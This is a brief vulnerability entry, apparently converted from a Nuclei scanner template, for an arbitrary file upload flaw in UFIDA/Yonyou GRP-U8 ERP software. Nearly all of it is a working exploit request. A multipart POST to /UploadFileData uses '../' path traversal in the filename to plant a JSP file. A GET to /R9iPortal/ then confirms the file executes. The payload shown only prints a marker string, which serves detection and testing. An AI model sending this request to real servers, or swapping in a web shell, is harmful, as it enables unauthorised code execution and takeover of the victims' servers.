# Vulnerability: UFIDA GRP-U8 UploadFileData - Arbitrary File Upload
**Classification:** YONYOU
**Source:** Nuclei Template (`grp-u8-uploadfiledata-fileupload.yaml`)

## Description
File upload vulnerability in UFIDA U8+ERP customer relationship management software. An attacker can use this vulnerability to gain control of the server.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /UploadFileData?action=upload_file&filename=../{{randstr_1}}.jsp HTTP/1.1
Host: {{Hostname}}
Content-Length: 327
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqoqnjtcw
Accept-Encoding: gzip

------WebKitFormBoundaryqoqnjtcw
Content-Disposition: form-data; name="upload"; filename="emgeyr.jsp"
Content-Type: application/octet-stream

<% {out.print("{{randstr_2}}");} %>
------WebKitFormBoundaryqoqnjtcw
Content-Disposition: form-data; name="submit"

submit
------WebKitFormBoundaryqoqnjtcw--

GET /R9iPortal/{{randstr_1}}.jsp HTTP/1.1
Host: {{Hostname}}
Accept-Encoding: gzip
```

